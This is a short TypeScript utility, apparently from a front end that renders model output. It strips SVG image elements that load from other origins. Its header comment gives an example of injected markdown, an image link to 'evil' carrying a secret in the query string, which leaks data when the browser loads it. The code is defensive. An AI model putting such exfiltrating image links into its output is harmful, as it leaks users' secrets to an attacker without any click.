/*
 * Rendered model output must not load remote images: an injected `![](https://evil/?q=<secret>)`
 * leaks data the moment the browser fetches it, without a click. Only our own origin loads.
 */

export function isSameOriginUrl(url: string): boolean {
  if (!url) return false;
  try {
    return new URL(url, window.location.href).origin === window.location.origin;
  } catch {
    return false;
  }
}

/** Remove SVG `<image>` elements (e.g. mermaid's image shape) whose href points elsewhere. */
export function stripRemoteSvgImages(svg: string): string {
  const doc = new window.DOMParser().parseFromString(svg, "image/svg+xml");
  const remote = Array.from(doc.querySelectorAll("image")).filter(
    (image) => !isSameOriginUrl(image.getAttribute("href") ?? image.getAttribute("xlink:href") ?? ""),
  );
  if (remote.length === 0) return svg;
  for (const image of remote) image.remove();
  return new window.XMLSerializer().serializeToString(doc);
}
